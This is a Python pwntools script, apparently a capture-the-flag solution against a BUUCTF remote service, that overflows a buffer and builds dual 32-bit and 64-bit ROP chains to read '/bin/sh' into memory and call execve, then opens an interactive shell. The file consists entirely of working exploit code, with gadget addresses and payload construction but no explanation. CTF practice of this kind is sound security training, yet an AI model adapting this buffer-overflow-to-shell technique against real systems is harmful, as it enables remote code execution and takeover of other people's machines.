from pwn import *

#p = process('./pwn2')
p = remote('node4.buuoj.cn', 28764)
elf32 = ELF('pwn1')
elf64 = ELF('pwn2')

#gdb.attach(p, 'b *0x400b33')
#gdb.attach(p, 'b *0x804892b')

pop_eax = 0x080a8af6
pop_edi = 0x08049748
pop_edx = 0x0806e9cb
pop_esi = 0x08049748
pop_ebx = 0x080481c9
pop_ecx_ebx = 0x0806e9f2
pop_3_ret_32 = 0x0806e9c9
int80 = 0x080495a3

pop_rdi = 0x4005f6
pop_rdx = 0x43b9d5
pop_rbx = 0x400d38
pop_rsi = 0x405895
pop_rax = 0x43b97c
syscall = 0x4011dc

bss32 = 0x080DAB00
bss64 = 0x6A32E0

add_esp_7c_pop_ebx_esi_edi_ebp = 0x0804933f

payload = b'a' * 0x110

#ebp of 64 and ret of 32
payload += p32(add_esp_7c_pop_ebx_esi_edi_ebp) + p32(0)

#rop of 64
payload += p64(pop_rdi) + p64(0) 
payload += p64(pop_rsi) + p64(bss64) 
payload += p64(pop_rdx) + p64(16)
payload += p64(elf64.sym['read'])
payload += p64(pop_rdi) + p64(bss64)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

#rop of 32
payload = payload.ljust(0x7c, b'\0')
payload += p32(0) * 2 
payload += p32(elf32.sym['read'])
payload += p32(pop_3_ret_32) + p32(0) + p32(bss32) + p32(16)
payload += p32(pop_ecx_ebx) + p32(0) + p32(bss32)
payload += p32(pop_edx) + p32(0)
payload += p32(pop_eax) + p32(0xb)
payload += p32(int80)

p.sendafter(b'it?\n', payload)
sleep(0.1)
p.send(b'/bin/sh')

p.interactive()